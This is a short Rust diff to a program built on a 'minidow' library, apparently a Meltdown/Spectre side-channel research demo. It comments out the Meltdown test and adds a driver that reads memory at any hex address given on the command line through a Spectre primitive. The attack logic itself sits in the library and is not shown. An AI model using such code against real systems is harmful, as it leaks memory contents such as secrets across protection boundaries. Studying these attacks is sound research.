@@ -3,6 +3,7 @@ use minidow::*;
 fn main() {
     setup_measurements();
 
+    /*
     let (tx, rx) = std::sync::mpsc::channel();
 
     std::thread::spawn(move || {
@@ -22,4 +23,9 @@ fn main() {
         "With Meltdown: 0x{:x}",
         read_ptr::<Meltdown>(|| {}, secret_addr)
     );
+    */
+
+    let arg = std::env::args().skip(1).take(1).next().unwrap();
+    let addr = usize::from_str_radix(&arg[2..], 16).unwrap();
+    println!("With Spectre: 0x{:x}", read_ptr::<Spectre>(|| {}, addr));
 }
